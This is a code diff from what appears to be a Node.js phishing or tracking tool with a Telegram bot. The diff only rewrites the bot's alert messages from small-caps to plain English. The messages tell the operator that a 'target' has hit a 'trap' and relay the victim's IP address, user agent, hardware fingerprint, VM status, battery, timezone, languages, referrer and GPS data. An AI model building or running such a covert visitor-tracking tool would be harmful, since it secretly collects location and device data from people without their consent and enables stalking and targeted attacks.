@@ -103,14 +103,14 @@ async function startServer() {
     if (botInstance) {
       const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
       
-      let msg = `🚩 <b>ᴛᴀʀɢᴇᴛ ʀᴇᴀᴄʜᴇᴅ ᴛʜᴇ ᴛʀᴀᴘ!</b> 🚩\n` +
+      let msg = `🚩 <b>Target access detected</b> 🚩\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n\n` +
-                `📅 <b>ᴡᴀᴋᴛᴜ:</b> <code>${timestamp} ᴡɪʙ</code>\n` +
-                `🌐 <b>ɪᴘ ᴀᴅᴅʀᴇꜱꜱ:</b> <code>${escapeHTML(String(ip))}</code>\n` +
-                `📁 <b>ᴛᴇᴍᴘʟᴀᴛᴇ:</b> <code>${templates[tmplId] ? escapeHTML(templates[tmplId].name) : 'ᴅᴇꜰᴀᴜʟᴛ'}</code>\n` +
-                `🖥️ <b>ᴜꜱᴇʀ-ᴀɢᴇɴᴛ:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n\n` +
+                `📅 <b>Time:</b> <code>${timestamp} WIB</code>\n` +
+                `🌐 <b>IP Address:</b> <code>${escapeHTML(String(ip))}</code>\n` +
+                `📁 <b>Template:</b> <code>${templates[tmplId] ? escapeHTML(templates[tmplId].name) : 'Default'}</code>\n` +
+                `🖥️ <b>User-Agent:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n` +
-                `⏳ <i>ᴍᴇɴɢᴜɴɢɢᴀʜ ᴅᴀᴛᴀ ʜᴀʀᴅᴡᴀʀᴇ & ɢᴘꜱ...</i>`;
+                `⏳ <i>Uploading hardware & GPS data...</i>`;
 
       botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
     }
@@ -166,26 +166,26 @@ async function startServer() {
 
       let msg = `<b>${header}</b>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n\n` +
-                  `📋 <b>ᴛᴇᴍᴘʟᴀᴛᴇ ɪɴꜰᴏ</b>\n` +
-                  `├ ɴᴀᴍᴇ: <code>${escapeHTML(templateName)}</code>\n` +
-                  `└ ꜰʟᴏᴡ: <code>ᴀᴅᴠᴀɴᴄᴇᴅ ᴀᴜᴅɪᴛ</code>\n\n` +
-                  `🖥️ <b>ʜᴀʀᴅᴡᴀʀᴇ ꜱᴘᴇᴄꜱ</b>\n` +
-                  `├ ᴘʟᴀᴛꜰᴏʀᴍ: <code>${escapeHTML(data.platform || 'ɴ/ᴀ')}</code>\n` +
-                  `├ ʙʀᴏᴡꜱᴇʀ: <code>${escapeHTML(data.vendor || 'ɴ/ᴀ')} (${data.onLine ? 'ᴏɴʟɪɴᴇ' : 'ᴏꜰꜰʟɪɴᴇ'})</code>\n` +
-                  `├ ᴄᴘᴜ ᴄᴏʀᴇꜱ: <code>${escapeHTML(String(data.cores || 'ɴ/ᴀ'))}</code>\n` +
-                  `├ ʀᴀᴍ (ᴇꜱᴛ): <code>${escapeHTML(String(data.mem || 'ɴ/ᴀ'))} ɢʙ</code>\n` +
-                  `├ ɢᴘᴜ: <code>${escapeHTML(data.gpu || 'ɴ/ᴀ')}</code>\n` +
-                  `├ ᴠᴍ ꜱᴛᴀᴛᴜꜱ: <code>${escapeHTML(data.vmStatus || 'ɴ/ᴀ')}</code>\n` +
-                  `└ ꜱᴄʀᴇᴇɴ: <code>${escapeHTML(data.screen || 'ɴ/ᴀ')}</code>\n\n` +
-                  `🔋 <b>ᴇɴᴇʀɢʏ & ᴘᴇʀꜰ</b>\n` +
-                  `├ ʙᴀᴛᴛᴇʀʏ: <code>${escapeHTML(data.battery || 'ɴ/ᴀ')}</code>\n` +
-                  `├ ᴄᴏɴɴᴇᴄᴛ: <code>${escapeHTML(data.connection || 'ɴ/ᴀ')}</code>\n` +
-                  `├ ʀᴇꜰʀᴇꜱʜ: <code>${escapeHTML(data.refreshRate || 'ᴠᴇʀɪꜰɪᴇᴅ')}</code>\n` +
-                  `└ ɢᴀᴍᴜᴛ: <code>${escapeHTML(data.gamut || 'ɴ/ᴀ')}</code>\n\n` +
-                  `🌍 <b>ʀᴇɢɪᴏɴ & ᴇɴᴠ</b>\n` +
-                  `├ ᴛɪᴍᴇᴢᴏɴᴇ: <code>${escapeHTML(data.timezone || 'ɴ/ᴀ')}</code>\n` +
-                  `├ ʟᴀɴɢꜱ: <code>${escapeHTML(data.langs || 'ɴ/ᴀ')}</code>\n` +
-                  `└ ʀᴇꜰᴇʀʀᴇʀ: <code>${escapeHTML(data.ref || 'ᴅɪʀᴇᴄᴛ')}</code>\n` +
+                  `📋 <b>Template Info</b>\n` +
+                  `├ Name: <code>${escapeHTML(templateName)}</code>\n` +
+                  `└ Flow: <code>Advanced Audit</code>\n\n` +
+                  `🖥️ <b>Hardware Specs</b>\n` +
+                  `├ Platform: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
+                  `├ Browser: <code>${escapeHTML(data.vendor || 'N/A')} (${data.onLine ? 'Online' : 'Offline'})</code>\n` +
+                  `├ CPU Cores: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
+                  `├ RAM (Est): <code>${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
+                  `├ GPU: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
+                  `├ VM Status: <code>${escapeHTML(data.vmStatus || 'N/A')}</code>\n` +
+                  `└ Screen: <code>${escapeHTML(data.screen || 'N/A')}</code>\n\n` +
+                  `🔋 <b>Energy & Perf</b>\n` +
+                  `├ Battery: <code>${escapeHTML(data.battery || 'N/A')}</code>\n` +
+                  `├ Connect: <code>${escapeHTML(data.connection || 'N/A')}</code>\n` +
+                  `├ Refresh: <code>${escapeHTML(data.refreshRate || 'Verified')}</code>\n` +
+                  `└ Gamut: <code>${escapeHTML(data.gamut || 'N/A')}</code>\n\n` +
+                  `🌍 <b>Region & Env</b>\n` +
+                  `├ Timezone: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
+                  `├ Langs: <code>${escapeHTML(data.langs || 'N/A')}</code>\n` +
+                  `└ Referrer: <code>${escapeHTML(data.ref || 'Direct')}</code>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
                   `${status}`;
 
